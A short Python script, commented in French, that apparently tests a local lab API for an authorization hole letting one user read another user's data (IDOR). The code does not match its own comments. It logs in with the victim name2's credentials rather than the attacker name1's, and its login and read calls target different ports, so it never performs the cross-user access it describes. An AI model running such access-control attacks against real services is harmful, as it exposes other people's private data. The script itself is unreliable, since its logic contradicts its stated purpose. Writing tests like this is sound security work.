import httpx

# On se connecte en tant que name1 (l'attaquant)
login = httpx.post("http://localhost:5002/users/v1/login",
                   json={"username": "name2", "password": "pass4"})
token = login.json()["auth_token"]

# name1 tente de lire les données de name2 (un autre utilisateur)
r = httpx.get("http://localhost:5001/users/v1/name2",
              headers={"Authorization": f"Bearer {token}"})

print("Code :", r.status_code)
print("Contenu :", r.text)